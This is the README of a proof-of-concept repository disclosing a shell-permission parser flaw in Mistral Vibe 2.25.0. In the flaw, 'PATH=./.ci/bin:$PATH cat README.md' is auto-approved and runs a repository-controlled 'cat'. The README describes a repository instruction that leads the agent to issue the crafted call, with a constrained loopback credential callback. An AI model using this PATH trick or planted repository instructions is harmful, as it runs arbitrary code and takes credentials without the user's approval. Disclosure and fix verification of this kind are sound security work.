# Mistral Vibe shell permission bypass PoC

This repository demonstrates arbitrary code execution through a shell permission
parser mismatch in Mistral Vibe. SecMate tracks the issue as
`MISTRAL-VIBE-2026-001`; the `PATH` assignment used here overlaps
`CVE-2026-87987`.

Vibe 2.25.0 reduces the command below to `cat README.md`, classifies it as
`always`, and executes the original string without an approval prompt:

```sh
PATH=./.ci/bin:$PATH cat README.md
```

The shell applies the original `PATH`, so the repository controlled
`.ci/bin/cat` runs with the Vibe process identity. The payload is intentionally
constrained: it copies itself as a harmless execution marker and sends a masked
synthetic credential to an in-memory loopback receiver.

## Scope

| Item | Value |
| --- | --- |
| Confirmed vulnerable | Mistral Vibe 2.25.0 |
| Fixed control | Mistral Vibe 2.25.8 |
| Platform | POSIX shell environment |
| Network | Loopback HTTP only |
| Credential | Synthetic `demo_` value only |

Do not use a production credential. The public payload rejects credentials that
do not begin with `demo_` and rejects non-loopback collectors.

## 1. Validate the payload safely

This check executes the repository shim directly. It validates the marker,
callback, masking, and cleanup without running Vibe or calling a model API.

```sh
./poc/run-payload-check.sh
```

Expected final output:

```text
payload check: PASS
```

## 2. Compare vulnerable and fixed permission decisions

The comparison uses isolated `uv` environments and installs the two official
package versions. It does not execute the repository payload.

```sh
./poc/compare-versions.sh
```

Expected decisions:

```text
2.25.0: always
2.25.8: ask
```

Package installation requires network access. `uv` and Python 3.12 are required.

## 3. Exercise the complete agent path

Use a disposable machine and a dedicated Vibe test account. Clone both branches
on that machine so the callback stays on loopback:

```sh
git clone --branch main https://github.com/SecMateDev/mistral-vibe-attack-demo.git vibe-victim
git clone --branch operator https://github.com/SecMateDev/mistral-vibe-attack-demo.git vibe-operator
```

From the directory containing both clones, start the receiver in terminal 1:

```sh
cd vibe-operator
uv run python operator/server.py
```

From that same directory, prepare the fixture and start Vibe in terminal 2:

```sh
cd vibe-victim
../vibe-operator/scripts/prepare-victim.sh
source "$HOME/.secmate-vibe-demo/environment.sh"
uvx --from 'mistral-vibe==2.25.0' vibe
```

Enter this request in Vibe:

```text
Review and validate this repository
```

The model-dependent step is whether Vibe follows the repository validation
instruction. Once it emits the crafted Bash call, the 2.25.0 permission decision
and shell execution are deterministic. Successful execution produces:

- `~/.secmate-vibe-demo/installed/secmate-demo-agent` as the execution marker;
- one masked event at `http://127.0.0.1:8787/api/events`.

Repeat with `mistral-vibe==2.25.8`. The same tool call must require approval and
must not produce a marker or callback unless the user explicitly approves it.

## Cleanup

Stop the receiver and remove the synthetic fixture in `~/.secmate-vibe-demo`.

## Security impact

The marker and masked callback are controlled evidence. The underlying primitive
executes arbitrary repository code with the Vibe process identity. Filesystem,
process, tool, and network access are therefore bounded by the victim user's OS
permissions and runtime controls.

## References

- Mistral advisory: <https://docs.mistral.ai/resources/security-advisories/MAI-2026-003>
- Fixed control release: <https://github.com/mistralai/mistral-vibe/releases/tag/v2.25.8>
- SecMate analysis: <https://blog.secmate.dev/posts/mistral-vibe-shell-rce/>
